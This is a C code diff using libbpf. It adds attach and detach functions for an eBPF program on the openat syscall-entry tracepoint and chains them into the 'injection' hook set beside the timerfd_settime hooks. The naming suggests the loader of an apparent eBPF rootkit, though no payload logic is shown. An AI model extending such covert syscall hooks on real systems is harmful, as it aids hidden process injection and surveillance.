@@ -17,10 +17,15 @@ int attach_sys_exit_timerfd_settime(struct kit_bpf *skel){
 	skel->links.sys_exit_timerfd_settime = bpf_program__attach(skel->progs.sys_exit_timerfd_settime);
     return libbpf_get_error(skel->links.sys_exit_timerfd_settime);
 }
+int attach_sys_enter_openat(struct kit_bpf *skel){
+	skel->links.sys_enter_openat = bpf_program__attach(skel->progs.sys_enter_openat);
+    return libbpf_get_error(skel->links.sys_enter_openat);
+}
 
 int attach_injection_all(struct kit_bpf *skel){
     return attach_sys_enter_timerfd_settime(skel)
-        || attach_sys_exit_timerfd_settime(skel);;
+        || attach_sys_exit_timerfd_settime(skel)
+        || attach_sys_enter_openat(skel);
 }
 
 
@@ -40,10 +45,19 @@ int detach_sys_exit_timerfd_settime(struct kit_bpf *skel){
     }
     return 0;
 }
+int detach_sys_enter_openat(struct kit_bpf *skel){
+    int err = detach_link_generic(skel->links.sys_enter_openat);
+    if(err<0){
+        fprintf(stderr, "Failed to detach injection link\n");
+        return -1;
+    }
+    return 0;
+}
 
 int detach_injection_all(struct kit_bpf *skel){
     return detach_sys_enter_timerfd_settime(skel)
-        || detach_sys_exit_timerfd_settime(skel);
+        || detach_sys_exit_timerfd_settime(skel)
+        || detach_sys_enter_openat(skel);
 }
 
 #endif
